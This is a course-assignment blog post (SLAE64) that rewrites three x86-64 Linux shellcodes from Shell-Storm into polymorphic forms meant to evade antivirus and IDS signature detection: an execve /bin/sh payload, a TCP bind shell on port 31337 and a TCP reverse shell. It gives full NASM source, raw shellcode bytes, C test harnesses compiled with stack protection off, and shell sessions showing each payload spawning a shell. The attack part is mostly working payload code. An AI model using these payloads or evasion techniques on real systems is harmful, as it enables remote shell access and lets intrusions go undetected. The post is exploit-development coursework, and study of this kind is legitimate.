---
title: "SLAE64 - Assignment #6 - Polymorphic Shellcodes"
tags: ["slae64", "assembly", "shellcode", "exploit-development"]
---

## Introduction

This is the blog post for the 6<sup>th</sup> Assignment of the SLAE64 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=7" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 64-bit Assembly language for the Intel Architecture (IA-x86_64) family of processors on the Linux platform.

The purpose of this assignment is to take 3 shellcodes from <a href="https://shell-storm.org/shellcode/index.html" target="_blank">Shell-Storm</a> from the **Intel x86-64** category and create polymorphic versions of them in order to beat pattern matching. Pattern matching means that a program (AV or IDS) has a database with **signatures**. A signature is bytes suite identifying a program. More information can be found at: <a href="https://phrack.org/issues/61/9.html" target="_blank">Polymorphic Shellcode Engine, by Phrack</a>. So, with polymorphism we preserve the functionality of the shellcode, by using equivalent instructions or garbage instructions that don't change the functionality at all, like `NOP`. 

The table below is used to navigate to each original and polymorphic shellcode and provides the size of the shellcode before and after the modifications.

| Shellcode name | Shellcode in Shell-Storm | Original Size | Polymorphic Size |
| -- | -- | -- | -- |
| [execve](#execve) | <a href="https://shell-storm.org/shellcode/files/shellcode-76.html" target="_blank">Shell-Storm execve</a> | 41 | 35 |
| [tcpbindshell](#tcpbindshell) | <a href="https://shell-storm.org/shellcode/files/shellcode-858.html" target="_blank">Shell-Storm tcpbindshell</a> | 150 | 124 |
| [tcpreverseshell](#tcpreverseshell) | <a href="https://shell-storm.org/shellcode/files/shellcode-857.html" target="_blank">Shell-Storm tcpreverseshell</a> | 118 | 109 |  

My code can be found in my Github: <a href="https://github.com/geobour98/slae64" target="_blank">geobour98's Github</a>.

## execve {#execve}

The original `execve("/bin/sh", ["/bin/sh"], NULL)` shellcode is the following:

```shell
\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05
```

The initial `Assembly` version (`execve-original.nasm`) would look like this:

```nasm
global _start
section .text

_start:

	xor rdx, rdx

	mov rbx, 0x68732f6e69622fff

	shr rbx, 0x8
	push rbx

	mov rdi, rsp

	xor rax, rax
	push rax

	push rdi

	mov rsi, rsp

	mov al, 0x3b
	syscall

	push 0x1
	pop rdi

	push 0x3c
	pop rax
	
	syscall
```

Briefly, 2 syscalls are executed, indicated by the 2 times of the instruction: `syscall`. The first syscall is `execve` and its number `59` is passed to `RAX`. The first argument in `RDI` is the string "/bin/sh\0", the second argument in `RSI` is the pointer to the memory location of the string and the third argument in `RDX` is `0`. The second syscall is `exit` and its number `60` is passed to `RAX`. Its only argument in `RDI` has the value `1` indicating that the program terminated unsuccessfully.

It should be noted that the author had declared the size of the shellcode as `33`, but after compiling and running the shellcode tester `C` program (`shellcode-original.c`) the size was found to be `41` bytes. So, we stick to the 2<sup>nd</sup> value as the size.

**shellcode-original.c**

```c
#include <stdio.h> 
#include <string.h> 

unsigned char code[] = \ 
"\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";

main() 
{ 
	printf("Shellcode Length: %d\n", strlen(code)); 
	
	int (*ret)() = (int(*)())code; 
	
	ret(); 
}
```

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/1_execve$ ./shellcode-original 
Shellcode Length: 41
$ id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ ls
compile.sh  execve-original  execve-original.nasm  execve-original.o  shellcode-original  shellcode-original.c
$ exit
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/1_execve$
```

The polymorphic version (`execve.nasm`) is the following:

```nasm
global _start
section .text

_start:

	xor rsi, rsi
	mul rsi		; clear rax and rdx

	mov rbx, 0x68732f6e69622fff

	shr rbx, 0x8	; "/bin/sh\0"
	push rbx

	mov rdi, rsp	; rdi points at the top of the stack, where is the string

	mov al, 0x3b	; 3b is the hex value of the decimal 59 for execve 
	syscall		; exec execve syscall

	xchg rdi, rax	; put reurn value in rdi

	push 0x3c
	pop rax		; 3c is the hex value of the decimal 60 for exit
	
	syscall		; exec exit syscall
```

The comments are self-explanatory for the functionality of this program, which is the same as the original.

Now the changes, that were made in the polymorphic version, are explained. The `MUL` instruction is used to clear the registers `RAX` and `RDX`. Also, `RSI` doesn't have to point at the memory location of the string "/bin/sh\0", so it has value `0`. The only argument of `exit` syscall, which is the `status`, doesn't necessarily have the value `1`, but needs to have any value different from `0` in order to indicate unsuccessful termination. So, the `XCHG` instruction is used to put the return value of the `execve` inside `RDI`, which is not `0`.

### Testing the execve polymorphic shellcode

Now we need to compile `execve.nasm` with the bash script `compile.sh` and extract the shellcode from the generated executable with the `objdump` one-liner.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/1_execve$ ./compile.sh execve
[+] Assembling with Nasm ... 
[+] Linking ... 
[+] Done!
```

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/1_execve$ objdump -d ./execve |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x48\x31\xf6\x48\xf7\xe6\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\xb0\x3b\x0f\x05\x48\x97\x6a\x3c\x58\x0f\x05"
```

After that, we modify the `shellcode.c` with the shellcode from `objdump`, which checks if a shellcode is working.

The whole `C` program is the following:

```c
#include <stdio.h> 
#include <string.h> 

unsigned char code[] = \ 
"\x48\x31\xf6\x48\xf7\xe6\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\xb0\x3b\x0f\x05\x48\x97\x6a\x3c\x58\x0f\x05";

main() 
{ 
	printf("Shellcode Length: %d\n", strlen(code)); 
	
	int (*ret)() = (int(*)())code; 
	
	ret(); 
}
```

Now we need to compile the `C` program, by disabling the stack protection as well as making the stack executable:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/1_execve$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

In order to verify that the payload is working we must execute `shellcode`.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/1_execve$ ./shellcode
Shellcode Length: 35
$ id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ ls
compile.sh  execve-original	  execve-original.o  execve.o	shellcode-original    shellcode.c
execve	    execve-original.nasm  execve.nasm	     shellcode	shellcode-original.c
$ exit
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/1_execve$
```

The shellcode is working, its size is `35` bytes and has been decreased by `6` bytes!

## tcpbindshell {#tcpbindshell}

The original `tcpbindshell` shellcode is the following:

```shell
\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05
``` 

The initial `Assembly` version (`tcpbindshell-original.nasm`) is the following:

```nasm
global _start
section .text

_start:

	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	xor r8, r8

	push 0x2
	pop rdi

	push 0x1
	pop rsi

	push 0x6
	pop rdx

	push 0x29
	pop rax

	syscall

	mov r8, rax

	xor r10, r10
	push r10
	push r10

	mov byte [rsp], 0x2

	mov word [rsp + 0x2], 0x697a

	mov rsi, rsp

	push r8
	pop rdi

	push 0x10
	pop rdx

	push 0x31
	pop rax

	syscall

	push r8
	pop rdi

	push 0x1
	pop rsi

	push 0x32
	pop rax

	syscall

	mov rsi, rsp

	xor rcx, rcx
	mov cl, 0x10
	push rcx

	mov rdx, rsp

	push r8
	pop rdi

	push 0x2b
	pop rax

	syscall

	pop rcx

	xor r9, r9
	mov r9, rax

	mov rdi, r9

	xor rsi, rsi

	push 0x3
	pop rsi

doop:
	dec rsi

	push 0x21
	pop rax

	syscall

	jne doop

	xor rdi, rdi
	push rdi
	push rdi
	pop rsi
	pop rdx

	mov rdi, 0x68732f6e69622f2f

	shr rdi, 0x8
	push rdi
	push rsp
	pop rdi

	push 0x3b
	pop rax

	syscall
```

Briefly, the following syscalls are executed: `socket`, `bind`, `listen`, `accept`, `dup2` and `execve`. The important things to note are: the listening port is `31337` and the original string in `execve` is "//bin/sh" that after the shifting becomes "/bin/sh\0".

The polymorphic version (`tcpbindshell.nasm`) is the following:

```nasm
global _start
section .text

_start:
	; socket
	xor rdi, rdi
	xor rsi, rsi
	mul rsi		; clear rax and rdx

	add rdi, 0x2

	add rsi, 0x1

	add rdx, 0x6

	add rax, 0x29
	syscall		; exec socket syscall

	mov r8, rax	; return value

	; bind
	xor r10, r10
	push r10

	mov byte [rsp], 0x2

	mov word [rsp + 0x2], 0x697a	; port 31337

	mov rsi, rsp

	push r8
	pop rdi

	push 0x10
	pop rdx

	push 0x31
	pop rax

	syscall		; exec bind syscall

	; listen
	push r8
	pop rdi

	push 0x32
	pop rax

	syscall		; exec listen syscall

	; accept
	push r8
	pop rdi

	xor rsi, rsi
	mov rdx, rsi

	push 0x2b
	pop rax

	syscall		; exec accept syscall

	mov rdi, rax	; return value of accept

	; dup2
	push 0x3
	pop rsi

doop:
	dec rsi

	push 0x21
	pop rax

	syscall		; exec dup2 syscall

	jne doop

	; execve
	xor rsi, rsi
	push rsi

	mov rdi, 0x68732f6e69622f2f
	shr rdi, 0x8

	push rdi
	push rsp
	pop rdi

	push 0x3b
	pop rax

	syscall		; exec execve syscall
```

The comments are self-explanatory for the functionality of this program, which is the same as the original.

Now the changes, that were made in the polymorphic version, are explained. Basically, some instructions that were using the `stack` were modified to use `registers` and some unnecessary instructions were removed.

### Testing the tcpbindshell polymorphic shellcode

Now we need to compile `tcpbindshell.nasm` with the bash script `compile.sh` and extract the shellcode from the generated executable with `objdump` one-liner.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/2_tcpbindshell$ ./compile.sh tcpbindshell
[+] Assembling with Nasm ... 
[+] Linking ... 
[+] Done!
```

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/2_tcpbindshell$ objdump -d ./tcpbindshell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x48\x31\xff\x48\x31\xf6\x48\xf7\xe6\x48\x83\xc7\x02\x48\x83\xc6\x01\x48\x83\xc2\x06\x48\x83\xc0\x29\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x32\x58\x0f\x05\x41\x50\x5f\x48\x31\xf6\x48\x89\xf2\x6a\x2b\x58\x0f\x05\x48\x89\xc7\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
```

After that, we modify the `shellcode.c` with the shellcode from `objdump`.

The whole `C` program is the following:

```c
#include <stdio.h> 
#include <string.h> 

unsigned char code[] = \ 
"\x48\x31\xff\x48\x31\xf6\x48\xf7\xe6\x48\x83\xc7\x02\x48\x83\xc6\x01\x48\x83\xc2\x06\x48\x83\xc0\x29\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x32\x58\x0f\x05\x41\x50\x5f\x48\x31\xf6\x48\x89\xf2\x6a\x2b\x58\x0f\x05\x48\x89\xc7\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";

main() 
{ 
	printf("Shellcode Length: %d\n", strlen(code)); 
	
	int (*ret)() = (int(*)())code; 
	
	ret(); 
}
```

Now we compile the `C` program.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/2_tcpbindshell$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

In order to verify that the payload is working we must execute `shellcode` and connect with `nc` on port `31337`.

1<sup>st</sup> window:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/2_tcpbindshell$ ./shellcode
Shellcode Length: 124

```

2<sup>nd</sup> window:

```shell
geobour98@slae64-dev:~$ nc localhost 31337
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
shellcode
shellcode-original
shellcode-original.c
shellcode.c
tcpbindshell
tcpbindshell-original
tcpbindshell-original.nasm
tcpbindshell-original.o
tcpbindshell.nasm
tcpbindshell.o
exit
geobour98@slae64-dev:~$
```

The shellcode is working, its size is `124` bytes and has been decreased by `26` bytes!

## tcpreverseshell {#tcpreverseshell}

The original `tcpreverseshell` shellcode is the following:

```shell
\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x7f\x01\x01\x01\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05
``` 

The initial `Assembly` version (`tcpreverseshell-original.nasm`) is the following:

```nasm
global _start
section .text

_start:

	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	xor r8, r8

	push 0x2
	pop rdi

	push 0x1
	pop rsi
	
	push 0x6
	pop rdx

	push 0x29
	pop rax

	syscall

	mov r8, rax
	
	xor rsi, rsi
	xor r10, r10

	push r10
	
	mov byte [rsp], 0x2

	mov word [rsp + 0x2], 0x697a

	mov dword [rsp + 0x4], 0x0101017f

	mov rsi, rsp

	push 0x10
	pop rdx
	
	push r8
	pop rdi

	push 0x2a
	pop rax

	syscall

	xor rsi, rsi
	push 0x3
	pop rsi

doop:
	dec rsi

	push 0x21
	pop rax
	
	syscall

	jne doop

	xor rdi, rdi
	push rdi
	push rdi
	pop rsi
	pop rdx

	mov rdi, 0x68732f6e69622f2f

	shr rdi, 0x8

	push rdi
	push rsp
	pop rdi
	
	push 0x3b
	pop rax

	syscall
```

A change that was made to test the shellcode was the IP address to connect to. From `192.168.1.10` it became `127.1.1.1` and in little endian hexadecimal format: `0x0101017f`.

Briefly, the following syscalls are executed: `socket`, `connect`, `dup2` and `execve`. The important things to note are: the port to connect to is `31337` and the original string in `execve` is "//bin/sh" that after the shifting becomes "/bin/sh\0".

The polymorphic version (`tcpreverseshell.nasm`) is the following:

```nasm
global _start
section .text

_start:
	; socket
	xor rdi, rdi
	xor rsi, rsi
	mul rsi		; clear rax and rdx

	add rdi, 0x2

	add rsi, 0x1
	
	add rdx, 0x6

	add rax, 0x29
	syscall		; exec socket syscall

	mov rdi, rax	; return value
	
	; connect
	xor rsi, rsi
	push rsi
	
	mov byte [rsp], 0x2

	mov word [rsp + 0x2], 0x697a		; port 31337

	mov dword [rsp + 0x4], 0x0101017f	; ip 127.1.1.1

	mov rsi, rsp

	push 0x10
	pop rdx
	
	push 0x2a
	pop rax

	syscall 	; exec connect syscall
	
	; dup2
	xor rsi, rsi
	push 0x3
	pop rsi

doop:
	dec rsi

	push 0x21
	pop rax
	
	syscall		; exec dup2 syscall

	jne doop

	; execve
	xor rdx, rdx
	xor rsi, rsi
	push rsi

	mov rdi, 0x68732f6e69622f2f
	shr rdi, 0x8

	push rdi
	push rsp
	pop rdi
	
	push 0x3b
	pop rax

	syscall		; exec execve syscall
```

The comments are self-explanatory for the functionality of this program, which is the same as the original.

Now the changes, that were made in the polymorphic version, are explained. Basically, some instructions that were using the `stack` were modified to use `registers` and some unnecessary instructions were removed.

### Testing the tcpreverseshell polymorphic shellcode

Now we need to compile `tcpreverseshell.nasm` with the bash script `compile.sh` and extract the shellcode from the generated executable with `objdump` one-liner.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/3_tcpreverseshell$ ./compile.sh tcpreverseshell
[+] Assembling with Nasm ... 
[+] Linking ... 
[+] Done!
```

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/3_tcpreverseshell$ objdump -d ./tcpreverseshell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x48\x31\xff\x48\x31\xf6\x48\xf7\xe6\x48\x83\xc7\x02\x48\x83\xc6\x01\x48\x83\xc2\x06\x48\x83\xc0\x29\x0f\x05\x48\x89\xc7\x48\x31\xf6\x56\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x7f\x01\x01\x01\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xd2\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
```

After that, we modify the `shellcode.c` with the shellcode from `objdump`.

The whole `C` program is the following:

```c
#include <stdio.h> 
#include <string.h> 

unsigned char code[] = \ 
"\x48\x31\xff\x48\x31\xf6\x48\xf7\xe6\x48\x83\xc7\x02\x48\x83\xc6\x01\x48\x83\xc2\x06\x48\x83\xc0\x29\x0f\x05\x48\x89\xc7\x48\x31\xf6\x56\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x7f\x01\x01\x01\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xd2\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";

main() 
{ 
	printf("Shellcode Length: %d\n", strlen(code)); 
	
	int (*ret)() = (int(*)())code; 
	
	ret(); 
}
```

Now we compile the `C` program.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/3_tcpreverseshell$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

In order to verify that the payload is working we must create a listener with `nc` on port `31337` and execute `shellcode` to connect back there.

1<sup>st</sup> window:

```shell
geobour98@slae64-dev:~$ nc -lvnp 31337
Listening on [0.0.0.0] (family 0, port 31337)

```

2<sup>nd</sup> window:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/6_Polymorphic/3_tcpreverseshell$ ./shellcode
Shellcode Length: 109

```

1<sup>st</sup> window again:

```shell
Connection from [127.0.0.1] port 31337 [tcp/*] accepted (family 2, sport 44436)
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
shellcode
shellcode-original
shellcode-original.c
shellcode.c
tcpreverseshell
tcpreverseshell-original
tcpreverseshell-original.nasm
tcpreverseshell-original.o
tcpreverseshell.nasm
tcpreverseshell.o
exit
geobour98@slae64-dev:~$ 
```

The shellcode is working, its size is `109` bytes and has been decreased by `9` bytes!

## Summary

The polymorphic versions of the shellcodes: `execve`, `tcpbindshell` and `tcpreverseshell` are succesfully created and working as the original ones. 

Next will be the custom crypter!

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **SLAE64 Blog Post**
>
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> 
> https://www.pentesteracademy.com/course?id=7
>
> ~~http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/~~
>
> **Student ID: PA-36167**
{: .prompt-info }
<!-- markdownlint-restore -->
